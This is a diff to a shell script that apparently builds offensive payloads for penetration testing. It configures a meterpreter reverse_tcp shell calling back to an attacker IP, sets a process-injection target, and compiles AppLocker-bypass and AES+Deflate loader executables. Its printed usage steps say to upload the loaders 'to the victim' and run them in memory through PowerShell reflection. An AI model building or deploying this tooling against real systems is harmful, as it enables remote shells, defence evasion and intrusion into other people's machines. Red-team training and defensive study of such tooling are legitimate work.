@@ -8,7 +8,7 @@ NET_OBFUSCATOR=$CURRENT_DIR"/NET-Obfuscate/NET-Obfuscate.exe"
 OUTPUT_CAESAR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/Caesar"
 OUTPUT_XOR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/XOR"
 
-PROCESS_TO_INJECT="EXPLORER.EXE"
+PROCESS_TO_INJECT="notepad"
 MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
 LHOST="192.168.100.128"
 LPORT=443
@@ -130,6 +130,15 @@ cp Templates/Applocker/InstallUtil.cs payloads/Applocker/
 sed -i 's/KALI_IP/'${LHOST}'/g' payloads/Applocker/InstallUtil.cs
 mcs -r:Templates/Applocker/System.Management.Automation.dll -r:System.Configuration.Install -out:payloads/Applocker/InstallUtil.exe payloads/Applocker/InstallUtil.cs
 
+echo "[+] Creating AES + Deflate ..."
+cp Templates/AES/AES_Deflate_HTTP.cs payloads/AES/AES_Deflate_HTTP.cs
+cp Templates/AES/AES_Deflate_SMB.cs payloads/AES/AES_Deflate_SMB.cs
+sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_HTTP.cs
+sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_SMB.cs
+mcs -out:payloads/AES/AES_Deflate_HTTP.exe payloads/AES/AES_Deflate_HTTP.cs
+mcs -out:payloads/AES/AES_Deflate_SMB.exe payloads/AES/AES_Deflate_SMB.cs
+
+
 echo "[+] Creating web.config file (Non-Encrypted)..."
 MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
 msfvenom$MSFVENOM &>/dev/null
@@ -175,6 +184,17 @@ echo "| [1] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedde
 echo "| [2] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedded_marshal.exe\"                                          |"
 echo "| [3] Example: des_decryptor_embeded.exe                                                                                              |"
 echo "| [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |"
+echo "|_____________________________________________________________________________________________________________________________________|"
+echo ""
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                                     AES + Deflate                                                                   |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [1] Upload 'AES_Deflate_SMB.exe' or 'AES_Deflate_HTTP.exe' to the victim                                                            |"
+echo "| [2] Copy 'AES_Deflate_SMB.exe' to SMB share or 'AES_Deflate_HTTP.exe' to Apache                                                     |"
+echo "| [3] Execution via Reflection:                                                                                                       |"
+echo "|     PS> $data=[IO.File]::ReadAllBytes('C:\Users\user\Desktop\AES_Deflate_SMB.exe')                                                  |"
+echo "|     PS> $ass=[System.Reflection.Assembly]::Load($data)                                                                              |"
+echo "|     PS> $ass.EntryPoint.Invoke($null,@($null))                                                                                      |"
 echo "|_____________________________________________________________________________________________________________________________________|"
 echo ""
 
